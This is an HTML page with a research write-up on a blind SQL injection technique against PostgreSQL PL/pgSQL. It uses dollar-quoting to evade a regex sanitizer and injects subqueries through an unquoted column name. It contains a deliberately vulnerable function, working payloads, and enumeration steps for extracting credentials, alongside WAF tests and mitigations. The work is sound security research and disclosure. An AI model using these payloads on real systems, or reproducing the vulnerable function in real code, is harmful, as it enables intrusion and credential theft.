@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Dollar-Quote Bypass: A Blind SQL Injection Technique Against PostgreSQL</title>
+
+<!-- EDIT these two URLs to your real GitHub Pages address before publishing -->
+<link rel="canonical" href="https://jrbusiness.github.io/dollar-quote-sqli/">
+<meta property="og:url" content="https://jrbusiness.github.io/dollar-quote-sqli/">
+
+<meta name="author" content="Jerry Luong">
+<meta name="description" content="A blind SQL injection technique against PostgreSQL that uses dollar-quoting to evade an application-level regex sanitizer, injects scalar subqueries through an unquoted column-name position, and extracts data through a boolean oracle with zero schema knowledge.">
+<meta name="keywords" content="SQL injection, PostgreSQL, PL/pgSQL, dollar-quoting, blind SQLi, scalar subquery, WAF, OWASP CRS, security research">
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dollar-Quote Bypass: A Blind SQL Injection Technique Against PostgreSQL">
+<meta property="og:description" content="Dollar-quoting to bypass a regex sanitizer, scalar subquery injection through an unquoted column name, and zero-knowledge blind extraction. Plus an honest WAF result.">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Dollar-Quote Bypass: Blind SQL Injection Against PostgreSQL">
+<meta name="twitter:description" content="Dollar-quoting bypass + scalar subquery injection + zero-knowledge blind extraction against PL/pgSQL.">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+<style>
+  :root{
+    --accent:#2563eb; --accent-soft:#eff4ff;
+    --bg:#ffffff; --fg:#1f2328; --muted:#656d76;
+    --code-bg:#f6f8fa; --border:#d0d7de; --ok:#1a7f37;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{
+    margin:0; background:var(--bg); color:var(--fg);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    font-size:17px; line-height:1.7;
+  }
+  .wrap{max-width:840px; margin:0 auto; padding:0 22px 80px}
+  header.hero{
+    border-bottom:1px solid var(--border); padding:54px 0 30px; margin-bottom:34px;
+  }
+  h1{font-size:2.05rem; line-height:1.25; margin:.1em 0 .35em; letter-spacing:-.01em}
+  .sub{color:var(--muted); font-size:1.02rem; margin:0 0 18px}
+  .byline{font-size:.96rem; color:var(--fg)}
+  .byline .name{font-weight:600}
+  .byline .aff,.byline .date{color:var(--muted)}
+  .badges{margin:18px 0 0; display:flex; flex-wrap:wrap; gap:8px}
+  .badge{
+    font-size:.74rem; font-weight:600; letter-spacing:.02em; text-transform:uppercase;
+    background:var(--accent-soft); color:var(--accent); padding:4px 10px; border-radius:999px;
+  }
+  .links{display:flex; flex-wrap:wrap; gap:10px; margin-top:22px}
+  .links a{
+    text-decoration:none; font-size:.9rem; font-weight:600;
+    border:1px solid var(--border); border-radius:8px; padding:8px 14px; color:var(--fg);
+    transition:.15s; background:#fff;
+  }
+  .links a:hover{border-color:var(--accent); color:var(--accent)}
+  .links a.primary{background:var(--accent); color:#fff; border-color:var(--accent)}
+  .links a.primary:hover{filter:brightness(1.08); color:#fff}
+  nav.toc{
+    background:var(--code-bg); border:1px solid var(--border); border-radius:10px;
+    padding:18px 22px; margin:0 0 40px; font-size:.95rem;
+  }
+  nav.toc strong{display:block; font-size:.78rem; text-transform:uppercase; letter-spacing:.05em; color:var(--muted); margin-bottom:8px}
+  nav.toc ol{margin:0; padding-left:1.3em; columns:2; column-gap:28px}
+  nav.toc a{color:var(--fg); text-decoration:none}
+  nav.toc a:hover{color:var(--accent); text-decoration:underline}
+  h2{font-size:1.5rem; margin:2.4em 0 .6em; padding-top:.3em; letter-spacing:-.01em}
+  h3{font-size:1.15rem; margin:1.8em 0 .5em; color:#30363d}
+  h4{font-size:1rem; margin:1.4em 0 .3em; color:var(--muted); text-transform:uppercase; letter-spacing:.03em; font-size:.82rem}
+  p{margin:.8em 0}
+  a{color:var(--accent)}
+  ul,ol{padding-left:1.5em}
+  li{margin:.3em 0}
+  code{
+    font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+    background:var(--code-bg); padding:.12em .4em; border-radius:5px; font-size:.86em;
+    border:1px solid var(--border);
+  }
+  pre{
+    background:var(--code-bg); border:1px solid var(--border); border-radius:10px;
+    padding:16px 18px; overflow-x:auto; margin:1.1em 0; font-size:.84rem; line-height:1.55;
+  }
+  pre code{background:none; border:none; padding:0; font-size:inherit}
+  .abstract{
+    background:var(--accent-soft); border-left:4px solid var(--accent);
+    border-radius:0 10px 10px 0; padding:18px 22px; margin:0 0 14px;
+  }
+  .abstract strong.label{
+    display:block; font-size:.78rem; text-transform:uppercase; letter-spacing:.06em;
+    color:var(--accent); margin-bottom:8px;
+  }
+  .abstract p{margin:0; font-size:.97rem}
+  table{border-collapse:collapse; width:100%; margin:1.2em 0; font-size:.9rem}
+  th,td{border:1px solid var(--border); padding:8px 12px; text-align:left; vertical-align:top}
+  th{background:var(--code-bg); font-weight:600}
+  td code{font-size:.82em}
+  .ok{color:var(--ok); font-weight:600}
+  .callout{
+    border:1px solid var(--border); border-left:4px solid #d4a72c; background:#fffbef;
+    border-radius:0 10px 10px 0; padding:14px 20px; margin:1.4em 0; font-size:.95rem;
+  }
+  footer{
+    border-top:1px solid var(--border); margin-top:60px; padding-top:24px;
+    color:var(--muted); font-size:.88rem;
+  }
+  footer a{color:var(--muted)}
+  @media (max-width:680px){
+    body{font-size:16px}
+    h1{font-size:1.65rem}
+    nav.toc ol{columns:1}
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="hero">
+  <h1>Dollar-Quote Bypass: A Blind SQL Injection Technique Against Regex-Sanitized Dynamic PL/pgSQL</h1>
+  <p class="sub">Dollar-quoting to slip past a regex sanitizer, scalar subquery injection through an unquoted column name, and zero-knowledge blind extraction against PostgreSQL.</p>
+  <p class="byline">
+    <span class="name">Jerry Luong</span><br>
+    <span class="aff">Independent Researcher</span> &middot;
+    <span class="date">May 2026</span>
+  </p>
+  <div class="badges">
+    <span class="badge">PostgreSQL</span>
+    <span class="badge">Blind SQLi</span>
+    <span class="badge">PL/pgSQL</span>
+    <span class="badge">Security Research</span>
+    <span class="badge">CC&nbsp;BY&nbsp;4.0</span>
+  </div>
+  <div class="links">
+    <a class="primary" href="Dollar_Quote_Bypass.tex">LaTeX source</a>
+    <a href="Dollar_Quote_Bypass_Research_Paper.md">Markdown</a>
+    <a href="attack_chain.bpmn">Attack-chain (BPMN)</a>
+    <!-- add Dollar_Quote_Bypass.pdf to the repo, then this link works -->
+    <a href="Dollar_Quote_Bypass.pdf">PDF</a>
+  </div>
+</header>
+
+<nav class="toc">
+  <strong>Contents</strong>
+  <ol>
+    <li><a href="#intro">Introduction</a></li>
+    <li><a href="#background">Background</a></li>
+    <li><a href="#pattern">The Vulnerable Pattern</a></li>
+    <li><a href="#method">Exploitation Methodology</a></li>
+    <li><a href="#enum">Zero-Knowledge Enumeration</a></li>
+    <li><a href="#results">Results</a></li>
+    <li><a href="#detection">Detection Claim Validation</a></li>
+    <li><a href="#limits">Limitations</a></li>
+    <li><a href="#comparison">Comparison with Existing Techniques</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#mitigations">Mitigations</a></li>
+    <li><a href="#ethics">Ethics &amp; Disclosure</a></li>
+    <li><a href="#refs">References</a></li>
+    <li><a href="#appendix">Appendix: Quick Reference</a></li>
+  </ol>
+</nav>
+
+<section class="abstract">
+  <strong class="label">Abstract</strong>
+  <p>We present a blind SQL injection technique that exploits PostgreSQL's dollar-quoting string syntax to evade an <strong>application-level</strong> regex sanitizer. By injecting scalar subqueries through unquoted column-name positions in dynamically-constructed <code>EXECUTE</code> statements, an attacker can enumerate all database objects visible to the executing role and extract arbitrary data with zero prior knowledge through a boolean oracle. The technique defeats a sanitizer that strips single-quote, semicolon, backslash, and hyphen characters, and works against PL/pgSQL functions that misuse <code>format()</code> or string concatenation with partial quoting. We stress that this is an <strong>application-layer sanitizer evasion, not a network-layer WAF bypass</strong>: when we replayed the payloads through a default OWASP Core Rule Set (CRS) 4.25.0 deployment, they were detected and blocked (<a href="#detection">Section&nbsp;7</a>). To our knowledge, as of May 29, 2026, no public tool or cheat-sheet consolidates this specific combination of dollar-quoted literals, unquoted-identifier injection, and blind extraction; this is based on a non-exhaustive review of sqlmap, PayloadsAllTheThings, and OWASP/PortSwigger materials (<a href="#comparison">Section&nbsp;9</a>), and should be read as "we did not find it documented," not as a proof of first discovery.</p>
+</section>
+
+<h2 id="intro">1. Introduction</h2>
+<p>SQL injection remains one of the most persistent vulnerabilities in web applications. Modern defenses, parameterized queries, ORMs, Web Application Firewalls, and input validation, have made traditional injection payloads like <code>' OR 1=1 --</code> increasingly ineffective. However, PostgreSQL's feature-rich SQL dialect introduces attack surfaces that standard injection tooling does not model.</p>
+<p>We identified a vulnerable code pattern in PL/pgSQL functions, the procedural language built into PostgreSQL, that allows an attacker to inject arbitrary SQL through an unquoted column-name position, evade a regex-based sanitizer using dollar-quoting, and exfiltrate data through a blind boolean oracle. This paper describes the vulnerability, the exploitation methodology, and a zero-knowledge enumeration technique that requires no prior information about the target database schema.</p>
+
+<h2 id="background">2. Background</h2>
+
+<h3>2.1 PostgreSQL Dollar-Quoting</h3>
+<p>PostgreSQL supports dollar-quoted string literals as an alternative to single-quote delimited strings:</p>
+<pre><code class="language-sql">SELECT $$hello world$$;        -- equivalent to SELECT 'hello world';
+SELECT $tag$hello world$tag$;  -- same, with a custom tag</code></pre>
+<p>Dollar-quoting is commonly used in PL/pgSQL function bodies to avoid escaping nested single quotes. Its use as an injection bypass primitive is less commonly covered than traditional single-quote, comment, stacked-query, and <code>UNION</code> payloads.</p>
+
+<h3>2.2 PL/pgSQL and EXECUTE</h3>
+<p>PL/pgSQL functions can use the <code>EXECUTE</code> statement to run dynamically-constructed SQL:</p>
+<pre><code class="language-sql">CREATE FUNCTION search(p_term TEXT) RETURNS SETOF record AS $$
+DECLARE
+    query TEXT;
+BEGIN
+    query := 'SELECT * FROM products WHERE name ILIKE ''%' || p_term || '%''';
+    RETURN QUERY EXECUTE query;
+END;
+$$ LANGUAGE plpgsql;</code></pre>
+<p>When combined with <code>SECURITY DEFINER</code> (which runs the function with the owner's privileges) and unsafe string construction, these functions become powerful attack vectors. The function above uses single-quote concatenation purely to illustrate <code>EXECUTE</code>; the specific pattern we exploit (<a href="#pattern">Section&nbsp;3</a>) is subtler, it quotes the <em>value</em> correctly but leaves the <em>column-name</em> position unquoted.</p>
+
+<h3>2.3 The format() Function</h3>
+<p>PostgreSQL's <code>format()</code> function provides type-safe string formatting:</p>
+<pre><code class="language-sql">SELECT format('SELECT %I FROM %I WHERE %I = %L', col, tbl, filter_col, val);</code></pre>
+<ul>
+  <li><code>%I</code> &mdash; SQL identifier (double-quoted, safe for column/table names)</li>
+  <li><code>%L</code> &mdash; SQL literal (single-quoted and escaped, safe for values)</li>
+  <li><code>%s</code> &mdash; plain string (NO escaping, <strong>dangerous</strong>)</li>
+</ul>
+<p>The vulnerability arises when developers use <code>%s</code> or raw concatenation for the column-name portion while using <code>quote_literal()</code> or <code>%L</code> for the value portion, creating a false sense of security.</p>
+
+<h3>2.4 Threat Model</h3>
+<p>We assume an attacker with the following capabilities, and no others:</p>
+<ul>
+  <li><strong>Unauthenticated (or low-privilege) HTTP access</strong> to an endpoint that forwards a user-controlled filter string into the vulnerable PL/pgSQL function.</li>
+  <li><strong>An observable boolean oracle</strong>: the response distinguishes a TRUE condition (rows returned) from a FALSE condition (no rows) through body content, response length, or status code.</li>
+  <li><strong>No prior knowledge</strong> of the database schema, <strong>no direct database connection</strong>, and no access to error messages, stack traces, <code>UNION</code>, or stacked queries.</li>
+</ul>
+<p>The executing database role must be able to read the targeted metadata (<code>information_schema</code>) and data; under <code>SECURITY DEFINER</code> this is the function owner's privilege set. The attacker needs no database authentication, file-system access, or out-of-band channel. This is a strictly weaker position than most SQL injection threat models assume, which is what makes the boolean-oracle constraint central to the technique.</p>
+
+<h2 id="pattern">3. The Vulnerable Pattern</h2>
+
+<h3>3.1 Target Function</h3>
+<p>The following function represents the vulnerable pattern we exploit. It accepts a filter string, attempts to "sanitize" it with a regex, and builds a <code>WHERE</code> clause dynamically:</p>
+<pre><code class="language-sql">CREATE OR REPLACE FUNCTION public.product_search(p_filters TEXT DEFAULT '')
+RETURNS TABLE(name TEXT, category TEXT, price NUMERIC, stock INTEGER) AS $$
+DECLARE
+    where_clause TEXT := '';
+    parts TEXT[];
+    part TEXT;
+    clean_part TEXT;
+    col_name TEXT;
+    val TEXT;
+BEGIN
+    parts := regexp_split_to_array(p_filters, ' AND ');
+
+    FOREACH part IN ARRAY parts LOOP
+        -- FLAW 1: Regex only strips ' ; -, leaving dollar-quoting intact
+        clean_part := regexp_replace(part, '['';\-]', '', 'g');
+
+        IF clean_part ~ '=' THEN
+            IF where_clause &lt;&gt; '' THEN
+                where_clause := where_clause || ' AND ';
+            END IF;
+            -- FLAW 2: Column name goes DIRECTLY into SQL (unquoted)
+            col_name := trim(split_part(clean_part, '=', 1));
+            val := trim(split_part(clean_part, '=', 2));
+            -- FLAW 3: quote_literal() protects only the value side, not the column
+            where_clause := where_clause || col_name || ' = ' || quote_literal(val);
+        END IF;
+    END LOOP;
+
+    IF where_clause = '' THEN
+        where_clause := '1=1';
+    END IF;
+
+    RETURN QUERY EXECUTE
+        'SELECT name, category, price, stock FROM public.products WHERE ' || where_clause;
+END;
+$$ LANGUAGE plpgsql SECURITY DEFINER;</code></pre>
+
+<h3>3.2 Analysis of Flaws</h3>
+<table>
+  <thead><tr><th>#</th><th>Flaw</th><th>Impact</th></tr></thead>
+  <tbody>
+    <tr><td>1</td><td><code>regexp_replace(part, '['';\-]', '', 'g')</code></td><td>After SQL un-doubles <code>''</code>, the character class is <code>'</code>, <code>;</code>, <code>\</code>, <code>-</code>, so it strips four characters but <strong>not <code>$</code></strong>. Dollar-quoting (<code>$_$...$_$</code>) passes through untouched.</td></tr>
+    <tr><td>2</td><td><code>col_name</code> concatenated directly into SQL</td><td>The attacker controls the LEFT side of the <code>=</code> comparison, any SQL expression, including scalar subqueries, can be injected here.</td></tr>
+    <tr><td>3</td><td><code>quote_literal(val)</code> only protects the RIGHT side</td><td>The developer assumed <code>quote_literal()</code> made the query safe, but the unquoted column-name position is the injection point.</td></tr>
+    <tr><td>4</td><td><code>SECURITY DEFINER</code> without <code>SET search_path</code></td><td>The function runs with the owner's privileges, potentially crossing schema boundaries.</td></tr>
+  </tbody>
+</table>
+
+<h3>3.3 Why This Evades the Application-Level Sanitizer</h3>
+<p>The application's sanitizer, and a developer reviewing it, typically account for:</p>
+<ul>
+  <li>Single quotes <code>'</code>, stripped by the regex</li>
+  <li>Semicolons <code>;</code>, stripped by the regex</li>
+  <li>Traditional injection markers: no single-quote, semicolon, comment sequence (<code>--</code>), or <code>UNION</code> keyword is required at the top level of the payload</li>
+  <li>Multiple <code>=</code> signs: the payload contains exactly ONE <code>=</code>, at the final comparison position</li>
+  <li>SQL errors in response: all probes return HTTP 200 with valid JSON</li>
+</ul>
+<p>In the lab validation, the working probes did not require single quotes, semicolons, SQL comments, stacked queries, or <code>UNION</code>. Whether they are detected in production depends on the deployed WAF, database logging, API telemetry, and rate limits.</p>
+
+<h2 id="method">4. Exploitation Methodology</h2>
+
+<h3>4.1 The Boolean Oracle</h3>
+<p>The vulnerable function returns a list of products. By crafting a <code>WHERE</code> clause that evaluates to TRUE or FALSE, the attacker observes:</p>
+<ul>
+  <li><strong>TRUE</strong> &rarr; Products returned (<code>count &gt; 0</code>)</li>
+  <li><strong>FALSE</strong> &rarr; No products returned (<code>count = 0</code>)</li>
+</ul>
+<p>This single bit of information enables blind data extraction.</p>
+
+<h3>4.2 Payload Construction</h3>
+<p>The critical constraint: <strong>exactly ONE <code>=</code> sign per payload</strong>. The function uses <code>split_part(clean_part, '=', 1)</code> to separate the column name from the value. An internal <code>=</code> sign (e.g., inside a subquery's WHERE clause) breaks the parsing.</p>
+<p><strong>Rule 1: Use <code>LIKE</code> inside subqueries, never <code>=</code>.</strong></p>
+<p><strong>Rule 2: Use lowercase <code>and</code> inside subqueries.</strong> The vulnerable function splits input on <code> AND </code> (uppercase). Lowercase <code>and</code> passes through the <code>regexp_split_to_array</code> call without being treated as a delimiter. If you need to combine multiple conditions inside a subquery, write <code>and</code> not <code>AND</code>.</p>
+<p><strong>Rule 3: Scalar subqueries must return exactly one row.</strong> Use <code>LIMIT 1 OFFSET n</code> when enumerating through sets that may contain multiple rows (e.g., listing multiple schema or table names). Without <code>LIMIT 1</code>, a subquery returning multiple rows will cause a runtime error and prevent extraction.</p>
+<h4>Correct payload</h4>
+<pre><code>(SELECT substr(secret,1,1) FROM secret_vault.api_keys WHERE service LIKE $_$stripe$_$) = w</code></pre>
+<h4>Broken payload (internal = confuses split_part)</h4>
+<pre><code>(SELECT substr(secret,1,1) FROM secret_vault.api_keys WHERE service = $_$stripe$_$) = w</code></pre>
+
+<h3>4.3 Payload Processing Flow</h3>
+<p>Given input: <code>(SELECT count(*) FROM t WHERE col LIKE $_$x$_$) = 1</code></p>
+<ol>
+  <li><code>regexp_split_to_array(input, ' AND ')</code> &rarr; single element</li>
+  <li><code>regexp_replace(part, '['';\-]', '', 'g')</code> &rarr; no stripping (<code>'</code>, <code>;</code>, <code>-</code> absent)</li>
+  <li><code>split_part(clean_part, '=', 1)</code> &rarr; <code>(SELECT count(*) FROM t WHERE col LIKE $_$x$_$) </code></li>
+  <li><code>trim(col_name)</code> &rarr; <code>(SELECT count(*) FROM t WHERE col LIKE $_$x$_$)</code></li>
+  <li><code>split_part(clean_part, '=', 2)</code> &rarr; <code> 1</code></li>
+  <li><code>trim(val)</code> &rarr; <code>1</code>; <code>quote_literal('1')</code> &rarr; <code>'1'</code></li>
+  <li>Final SQL: <code>SELECT ... WHERE (SELECT count(*) FROM t WHERE col LIKE $_$x$_$) = '1'</code></li>
+</ol>
+<p>The comparison coerces the unknown-type literal <code>'1'</code> to the <code>bigint</code> returned by <code>count(*)</code>. If count = 1, the <code>WHERE</code> clause is TRUE.</p>
+
+<h3>4.4 Handling Stripped Characters</h3>
+<p>Characters stripped by the regex (<code>'</code>, <code>;</code>, <code>-</code>) cannot be tested directly because they are removed from the payload before reaching SQL. The solution is the <strong>ASCII-code fallback</strong>:</p>
+<pre><code>(SELECT ascii(substr(secret,4,1)) FROM t WHERE col LIKE $_$x$_$) = 45</code></pre>
+<p>The integer <code>45</code> (ASCII code for <code>-</code>) contains no stripped characters. The comparison coerces the literal <code>'45'</code> to the integer returned by <code>ascii(...)</code>.</p>
+
+<h2 id="enum">5. Zero-Knowledge Enumeration</h2>
+<p>An attacker with no prior knowledge of the database can enumerate all objects visible to the executing role through PostgreSQL's <code>information_schema</code>:</p>
+
+<h3>Phase 1: Discover Schemas</h3>
+<pre><code class="language-sql">(SELECT count(*) FROM information_schema.schemata
+ WHERE schema_name LIKE $_$public$_$) = 1
+-- count > 0 means the schema exists</code></pre>
+<p>To enumerate all schema names (not just probe for known ones), use a scalar subquery with <code>LIMIT 1 OFFSET n</code>:</p>
+<pre><code class="language-sql">(SELECT substr(schema_name,1,1) FROM information_schema.schemata
+ WHERE schema_name NOT LIKE $_$pg_%$_$
+ and schema_name NOT LIKE $_$information_schema$_$
+ ORDER BY schema_name LIMIT 1 OFFSET 0) = p
+-- first char of the first user schema, then OFFSET 1 for the next, etc.</code></pre>
+<p>Note: Use lowercase <code>and</code> inside subqueries to avoid being split on <code> AND </code> (uppercase) by the vulnerable function's parser.</p>
+
+<h3>Phase 2: Discover Tables</h3>
+<pre><code class="language-sql">(SELECT count(*) FROM information_schema.tables
+ WHERE table_schema LIKE $_$secret_vault$_$
+ and table_name LIKE $_$users$_$) = 1</code></pre>
+
+<h3>Phase 3: Discover Columns</h3>
+<pre><code class="language-sql">(SELECT count(*) FROM information_schema.columns
+ WHERE table_schema LIKE $_$secret_vault$_$
+ and table_name LIKE $_$users$_$
+ and column_name LIKE $_$password_hash$_$) = 1</code></pre>
+
+<h3>Phase 4: Discover Rows (Users)</h3>
+<pre><code class="language-sql">(SELECT count(*) FROM secret_vault.users
+ WHERE username LIKE $_$admin$_$) = 1</code></pre>
+
+<h3>Phase 5: Extract Data Character by Character</h3>
+<pre><code class="language-sql">(SELECT substr(password_hash,1,1) FROM secret_vault.users
+ WHERE username LIKE $_$admin$_$) = $
+-- Test each printable character until count > 0</code></pre>
+
+<h3>Complete Flow</h3>
+<pre><code>information_schema.schemata -> 'public', 'secret_vault'
+information_schema.tables   -> 'users', 'api_keys'
+information_schema.columns  -> 'username', 'password_hash', 'totp_secret', 'role'
+Extract usernames           -> 'admin', 'root', 'jdoe', ...
+Extract credentials         -> bcrypt hashes, TOTP seeds, API keys</code></pre>
+
+<h3>Example: Extracted Credentials</h3>
+<pre><code>username:      admin
+password_hash: $2b$12$LJ3m4N5pQ6rS8tU9vW0xYzA1bC2dE3fG4hI5j
+totp_secret:   JBSWY3DPEHPK3PXP
+role:          admin</code></pre>
+
+<h2 id="results">6. Results</h2>
+<p>We tested the technique against a deliberately-vulnerable PL/pgSQL function exposed through an HTTP API. The attack successfully extracted all synthetic credentials from a protected schema:</p>
+<table>
+  <thead><tr><th>Service</th><th>Secret Extracted</th><th>Verified</th></tr></thead>
+  <tbody>
+    <tr><td>stripe</td><td><code>whsec_9bD4fG7kJ2mN5pR8sT1vW3xY6zA0cB</code></td><td class="ok">YES</td></tr>
+    <tr><td>aws</td><td><code>wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY</code></td><td class="ok">YES</td></tr>
+    <tr><td>sendgrid</td><td><code>9fG2iJ5lM8oP1rT4uV7wX0yZ3aB6cD9eF</code></td><td class="ok">YES</td></tr>
+    <tr><td>github</td><td><code>ghs_5O6p7Q8r9S0t1U2v3W4x5Y6z7A8b9C0d</code></td><td class="ok">YES</td></tr>
+    <tr><td>openai</td><td><code>org-secret-pqr678stu901vwx234yz</code></td><td class="ok">YES</td></tr>
+    <tr><td>datadog</td><td><code>k9l8m7n6o5p4q3r2s1t0u</code></td><td class="ok">YES</td></tr>
+    <tr><td>cloudflare</td><td><code>q6r7s8t9u0v1w2x3y4z5a6b7c8d9e0f1</code></td><td class="ok">YES</td></tr>
+    <tr><td>slack</td><td><code>xoxp-987654321098-9876543210987</code></td><td class="ok">YES</td></tr>
+    <tr><td>twilio</td><td><code>9f8e7d6c5b4a3210987654321fedcba</code></td><td class="ok">YES</td></tr>
+  </tbody>
+</table>
+<p><strong>9/9 services extracted with 100% accuracy</strong> through 15,808 blind HTTP requests. In the tested lab configuration, the successful probes produced normal boolean-oracle responses and did not require visible SQL error output.</p>
+
+<h2 id="detection">7. Detection Claim Validation</h2>
+<p>We separately validated the "undetected by traditional markers" claim against a Neon PostgreSQL 17.10 lab on May 29, 2026. The lab used <code>public.products</code> as the oracle table, <code>secret_vault.users</code> and <code>secret_vault.api_keys</code> as synthetic protected data, and a deliberately-vulnerable <code>public.codex_product_search(text)</code> function matching the parser shown above.</p>
+<p>The following database-level payload properties were validated across seven working probes:</p>
+<table>
+  <thead><tr><th>Property</th><th>Result</th></tr></thead>
+  <tbody>
+    <tr><td>Exactly one <code>=</code> character per payload</td><td class="ok">PASS</td></tr>
+    <tr><td>No single quote required</td><td class="ok">PASS</td></tr>
+    <tr><td>No semicolon required</td><td class="ok">PASS</td></tr>
+    <tr><td>No SQL comment marker (<code>--</code>, <code>/*</code>, <code>*/</code>) required</td><td class="ok">PASS</td></tr>
+    <tr><td>No <code>UNION</code> keyword required</td><td class="ok">PASS</td></tr>
+    <tr><td>Dollar-quoted literal survived the sanitizer</td><td class="ok">PASS</td></tr>
+    <tr><td>Successful probes returned oracle results without SQL exceptions when sent directly to the backend</td><td class="ok">PASS</td></tr>
+    <tr><td>ASCII fallback detected stripped <code>-</code> characters</td><td class="ok">PASS</td></tr>
+    <tr><td>Lowercase <code>and</code> worked inside subqueries without triggering the parser split</td><td class="ok">PASS</td></tr>
+  </tbody>
+</table>
+<p>We then tested the same payloads through an OWASP CRS / ModSecurity reverse proxy using the <code>owasp/modsecurity-crs:nginx</code> Docker image with CRS 4.25.0, blocking mode enabled, paranoia level 1, and an inbound anomaly threshold of 5.</p>
+<table>
+  <thead><tr><th>Probe Type</th><th>HTTP Result</th><th>CRS Result</th></tr></thead>
+  <tbody>
+    <tr><td>Normal filter: <code>category = tools</code></td><td>200</td><td>Allowed</td></tr>
+    <tr><td>Normal false filter: <code>category = missing</code></td><td>200</td><td>Allowed</td></tr>
+    <tr><td>Classic quote/OR payload</td><td>403</td><td>Blocked</td></tr>
+    <tr><td>Classic <code>UNION SELECT</code> payload</td><td>403</td><td>Blocked</td></tr>
+    <tr><td>Dollar-quoted scalar count probe</td><td>403</td><td>Blocked</td></tr>
+    <tr><td>Dollar-quoted character extraction probe</td><td>403</td><td>Blocked</td></tr>
+    <tr><td>ASCII fallback probe</td><td>403</td><td>Blocked</td></tr>
+    <tr><td><code>information_schema</code> metadata probe</td><td>403</td><td>Blocked</td></tr>
+  </tbody>
+</table>
+<p>The OWASP CRS test did <strong>not</strong> validate a WAF bypass claim. CRS blocked the dollar-quote payloads even though they avoided single quotes, semicolons, comments, and <code>UNION</code>. The main triggered rules included:</p>
+<ul>
+  <li><code>942100</code> &mdash; SQL Injection Attack Detected via libinjection</li>
+  <li><code>942151</code> &mdash; SQL function name detected</li>
+  <li><code>942360</code> &mdash; concatenated basic SQL injection / SQLLFI pattern</li>
+  <li><code>942140</code> &mdash; common database names detected, for <code>information_schema</code></li>
+  <li><code>949110</code> &mdash; inbound anomaly score exceeded</li>
+</ul>
+<div class="callout">
+  <strong>Honest scope.</strong> The validated claim is narrower than "undetectable": this payload family avoids several traditional SQL injection markers and executes cleanly against the vulnerable PostgreSQL parser, but it is <em>detected by default OWASP CRS 4.25.0 in blocking mode</em>. A production detection claim requires testing against the target's actual HTTP path, WAF rules, database logs, and request-volume thresholds.
+</div>
+<p>The corollary defines the technique's relevant threat model. The attack is meaningful against an application that relies on a <strong>custom, hand-rolled input sanitizer</strong>, such as the <code>regexp_replace</code> filter in Section 3, and that deploys <strong>no WAF, or a WAF tuned below the rules above</strong>. This describes a large class of legacy, internal, and enterprise PostgreSQL applications. Against such targets the application-level evasion is the entire attack; against a default CRS deployment it is not sufficient, and an additional WAF-evasion layer (outside this paper's scope) would be required.</p>
+
+<h2 id="limits">8. Limitations</h2>
+<p>This technique depends on a specific vulnerable pattern:</p>
+<ol>
+  <li>Dynamic SQL is executed through PL/pgSQL <code>EXECUTE</code>.</li>
+  <li>User input reaches an unquoted identifier or expression position.</li>
+  <li>The application strips or filters traditional SQL injection characters but allows dollar signs.</li>
+  <li>The parser leaves exactly one useful top-level <code>=</code> comparison.</li>
+  <li>The executing role can read useful metadata or target data.</li>
+</ol>
+<p>Scalar subqueries must return exactly one row. Enumeration payloads should use deterministic ordering with <code>LIMIT 1 OFFSET n</code> when walking through sets of schemas, tables, columns, or rows.</p>
+
+<h2 id="comparison">9. Comparison with Existing Techniques</h2>
+<h3>9.1 sqlmap</h3>
+<p>sqlmap (the most widely-used SQL injection automation tool) does not appear to include this payload family in its default payload XML files. On May 29, 2026, we checked <code>sqlmap/data/xml/payloads/</code> at commit <code>e659543</code> and found no references to <code>$_$</code>, dollar-quoted literals, or this unquoted-expression pattern.</p>
+<h3>9.2 PayloadsAllTheThings</h3>
+<p>PayloadsAllTheThings documents many PostgreSQL SQL injection techniques, but we did not find this exact combination of dollar-quoted literals, regex filter bypass, and scalar subquery injection through an unquoted column-name position in the SQL Injection section checked on May 29, 2026.</p>
+<h3>9.3 OWASP / PortSwigger</h3>
+<p>OWASP and PortSwigger document SQL injection prevention and exploitation concepts extensively, but their public SQL injection materials do not appear to describe this exact PostgreSQL dollar-quote bypass pattern.</p>
+
+<h2 id="conclusion">10. Conclusion</h2>
+<p>We presented a blind SQL injection technique that exploits PostgreSQL dollar-quoting to bypass regex-based input sanitization, combined with scalar subquery injection through unquoted column-name positions in dynamically-constructed <code>EXECUTE</code> statements. The technique enables enumeration of database objects visible to the executing role and extraction of accessible data with zero prior knowledge. The working payloads avoid several conventional SQL injection markers, including single quotes, semicolons, comment markers, stacked queries, and <code>UNION</code>; however, testing against OWASP CRS 4.25.0 showed that modern WAF rules can still detect the broader SQL expression structure.</p>
+<p>The vulnerability class requires a specific code pattern: PL/pgSQL functions with <code>EXECUTE</code>, partially-quoted dynamic SQL (column names unquoted), and regex-based sanitization that fails to account for dollar-quoting. While this pattern is less common in modern applications using ORMs and parameterized queries, it remains present in legacy systems, internal tools, and custom enterprise applications with PostgreSQL-heavy architectures.</p>
+<p>We recommend that this technique be incorporated into PostgreSQL-focused SQL injection testing, WAF rule review, and developer training materials.</p>
+
+<h2 id="mitigations">11. Mitigations</h2>
+<p>The vulnerability is an application-layer coding defect, and the mitigations are correspondingly definitive:</p>
+<ol>
+  <li><strong>Never place user input in an unquoted SQL position.</strong> Use <code>format()</code> with <code>%I</code> for identifiers and <code>%L</code> for literals, or parameterize through the driver. A correctly written query is immune regardless of PostgreSQL version or WAF configuration.</li>
+  <li><strong>Do not rely on regex denylists.</strong> Stripping <code>'</code>, <code>;</code>, <code>-</code> is defeated by dollar-quoting and by Unicode; sanitization must be allowlist-based or, preferably, replaced by parameterization.</li>
+  <li><strong>Lock <code>search_path</code> in <code>SECURITY DEFINER</code> functions</strong> (e.g. <code>SET search_path = pg_catalog, pg_temp</code>) to prevent cross-schema reads.</li>
+  <li><strong>Return generic responses</strong> so the boolean oracle and any error-based inference are removed.</li>
